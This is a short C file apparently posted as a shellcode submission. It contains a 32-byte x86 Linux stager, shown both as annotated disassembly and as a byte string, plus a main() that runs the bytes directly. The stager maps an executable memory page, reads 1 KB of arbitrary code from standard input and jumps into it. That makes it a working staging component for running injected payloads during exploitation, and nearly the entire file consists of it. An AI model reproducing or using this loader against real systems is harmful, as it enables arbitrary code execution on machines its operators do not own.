#include <stdio.h>
/*

load 1Kb from stdin then exec --  32 Bytes -- 8MAY2017 -- icon

0:  31 c0                   xor    eax,eax
2:  31 db                   xor    ebx,ebx
4:  50                      push   eax
5:  6a ff                   push   0xffffffff
7:  6a 22                   push   0x22
9:  6a 07                   push   0x7
b:  b7 04                   mov    bh,0x4
d:  53                      push   ebx
e:  50                      push   eax
f:  89 e3                   mov    ebx,esp
11: b0 5a                   mov    al,0x5a
13: cd 80                   int    0x80
15: 91                      xchg   ecx,eax
16: 6a 03                   push   0x3
18: 58                      pop    eax
19: 5b                      pop    ebx
1a: 5a                      pop    edx
1b: cd 80                   int    0x80
1d: ff e1                   jmp    ecx
*/

char loader[] = \
"\x31\xC0\x31\xDB\x50\x6A\xFF\x6A\x22\x6A\x07\xB7\x04\x53"
"\x50\x89\xE3\xB0\x5A\xCD\x80\x91\x6A\x03\x58\x5B\x5A\xCD"
"\x80\xFF\xE1"
;


int main(int argc, char **argv){
  int (*test)() = (int(*)())loader;
  test();
}
